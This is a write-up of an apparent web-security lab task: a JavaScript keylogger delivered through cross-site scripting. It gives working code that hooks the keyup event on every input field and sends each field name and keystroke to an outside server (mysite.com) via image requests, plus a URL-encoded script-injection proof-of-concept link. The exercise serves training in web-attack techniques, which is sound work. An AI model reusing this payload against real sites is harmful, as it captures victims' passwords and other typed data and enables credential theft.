## Task 7 <small>[[Try Now]](http://pentesteracademylab.appspot.com/lab/webapp/jfp/7)</small>

Objectives:

1. Create a KeyLogger which posts Keystrokes live to an attacker server

So in the previous task you have learnt about intercepting the click invent. In this case we are supposed to capture the keyboard events and post it on the attackers server.

The user will only enter in the input fields, so adding listeners for entire DOM is not a good approach. In this case, we will find all input and attach the event listener on it.

```js
document.querySelectorAll("input").forEach((input) => {
  input.addEventListener("keyup", (e) => {
    new Image().src = "http://mysite.com?input=" + e.target.name + "&key=" + e.key;
  });
});
```

I am using `e.target.name` to get the name of input where keyup event is happening, `.key` will contain the character being pressed by the user (or you can use `e.keyCode` to get the ASCII code of the key). This time I have not used _preventDefault()_, because I didn't want to block the default behavior of the event.

Also you have seen I am using `new Image().src` to perform GET request. This is because some sandboxed browsers might block so many ajax requests

**Note** The keyup event will be trigger whenever victim will release the key after pressing

For POC, [Click Here](http://pentesteracademylab.appspot.com/lab/webapp/jfp/7?url=%3Cscript%3Edocument.querySelectorAll%28%22input%22%29.forEach%28%28input%29%20%3D%3E%20%7B%0A%20%20input.addEventListener%28%22keyup%22%2C%20%28e%29%20%3D%3E%20%7B%0A%20%20%20%20new%20Image%28%29.src%20%3D%20%22http%3A%2F%2Fmysite.com%3Finput%3D%22%20%2B%20e.target.name%20%2B%20%22%26key%3D%22%20%2B%20e.key%3B%0A%20%20%7D%29%3B%0A%7D%29%3B%3C%2Fscript%3E)

**More Resources**

1. [`keyup` vs `keydown` vs `keypress`](https://stackoverflow.com/questions/3396754/onkeypress-vs-onkeyup-and-onkeydown)
